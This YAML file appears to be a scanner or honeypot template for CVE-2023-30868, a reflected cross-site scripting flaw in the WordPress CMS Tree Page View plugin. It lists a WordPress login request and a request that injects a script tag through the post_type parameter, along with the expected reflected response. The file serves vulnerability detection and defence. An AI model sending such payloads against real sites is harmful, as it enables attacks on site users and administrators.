id: CVE-2023-30868
info:
  name: Tree Page View Plugin < 1.6.7 - Cross-Site Scripting
  author: r3Y3r53
  description: 'The CMS Tree Page View plugin for WordPress has a Reflected Cross-Site
    Scripting vulnerability up to version 1.6.7. This is due to the post_type parameter
    not properly escaping user input. As a result, users with administrator privileges
    or higher can inject JavaScript code that will execute whenever accessed.

    '
  severity: medium
  reference:
  - https://www.exploit-db.com/exploits/51507
  - https://wpscan.com/vulnerability/407c62af-8e2d-441d-8332-0afad5d07014
  - https://nvd.nist.gov/vuln/detail/CVE-2023-30868
  - http://packetstormsecurity.com/files/172730/WordPress-Tree-Page-View-1.6.7-Cross-Site-Scripting.html
  - https://patchstack.com/database/vulnerability/cms-tree-page-view/wordpress-cms-tree-page-view-plugin-1-6-7-cross-site-scripting-xss-vulnerability?_s_id=cve
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2023-30868
    cwe-id: CWE-79
    epss-score: 0.00069
    epss-percentile: 0.28435
    cpe: cpe:2.3:a:cms_tree_page_view_project:cms_tree_page_view:*:*:*:*:*:wordpress:*:*
  metadata:
    verified: true
    max-request: 2
    vendor: cms_tree_page_view_project
    product: cms_tree_page_view
    framework: wordpress
  tags: cve2023,cve,wpscan,packetstorm,xss,wp,wordpress,authenticated,exploitdb,cms_tree_page_view_project
traps:
- request:
    method: POST
    path: /wp-login.php
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: 'log={{username}}&pwd={{password}}&wp-submit=Log+In

      '
  response:
    status_code: 200
    headers: {}
    body: ''
- request:
    method: GET
    path: /wp-admin/edit.php?page=cms-tpv-page-post&post_type=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
    headers: {}
    body: ''
  response:
    status_code: 200
    headers: {}
    body: '%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3ECMS Tree Page View'
